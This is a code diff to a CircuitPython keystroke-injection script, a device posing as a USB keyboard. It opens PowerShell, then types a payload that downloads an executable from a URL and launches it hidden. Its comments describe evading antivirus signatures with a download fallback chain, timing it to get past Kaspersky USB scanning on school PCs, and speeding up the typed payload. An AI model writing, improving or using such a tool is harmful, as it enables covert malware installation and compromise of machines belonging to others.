@@ -6,12 +6,12 @@
 # - iwr → WebClient → bitsadmin fallback chain (certutil was signatured LOLBin)
 # - Retry loop in PS (6 attempts × 3s = 18s coverage)
 # - Start-Process -WindowStyle Hidden + exit (was bare Start-Process)
-# - Human-like timing jitter (random 20-80ms, not uniform 5ms)
 # - LED error signal: fast blink = download failed
 # - ENUM_WAIT 5s → 8s (Kaspersky USB scanning on school PCs)
+# - v3.1: payload blasts at max speed (write() handles char sequencing).
+#   Per-char delays removed — 22s visible typing was too slow.
 
 import time
-import random
 import board
 import digitalio
 import usb_hid
@@ -65,10 +65,8 @@ time.sleep(0.1)
 kbd.release_all()
 time.sleep(0.4)
 
-# Type with human-like pacing
-for char in "powershell":
-    layout.write(char)
-    time.sleep(random.uniform(0.03, 0.08))
+# Blast "powershell" fast — no point being slow here
+layout.write("powershell")
 time.sleep(0.15)
 
 kbd.press(Keycode.ENTER)
@@ -100,11 +98,9 @@ PAYLOAD = (
     "exit"
 ).format(URL=EXE_URL)
 
-# Human-like typing with random jitter (20-80ms per char)
-for char in PAYLOAD:
-    layout.write(char)
-    time.sleep(random.uniform(0.02, 0.08))
-
+# Blast the payload — max speed. The write() method handles
+# character sequencing internally. No need for per-char delays.
+layout.write(PAYLOAD)
 time.sleep(0.15)
 
 # Execute
